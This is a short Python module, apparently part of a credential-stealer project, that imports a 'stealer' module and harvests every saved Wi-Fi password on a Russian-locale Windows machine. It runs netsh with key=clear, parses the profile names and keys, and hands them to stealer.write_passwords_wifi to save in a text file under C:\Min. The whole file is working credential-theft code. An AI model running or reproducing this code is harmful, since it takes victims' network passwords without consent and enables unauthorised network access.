import subprocess
import stealer

def get_all_passwords():
    try:
        data = subprocess.check_output("netsh wlan show profiles").decode('cp866').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "Все профили пользователей" in i]
        pass_wifi = ''

        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('cp866').split('\n')

            for j in results:
                if "Содержимое ключа" in j:
                    pass_wifi += f"{i} -- {j.split(':')[1][1:-1]}\n"

    except Exception as ex:
        print(f'Ошибка: {ex}')
    finally:
        try:
            stealer.write_passwords_wifi("C:\\Min\\passwordsWifi.txt", pass_wifi)
        except Exception as e:
            print(e)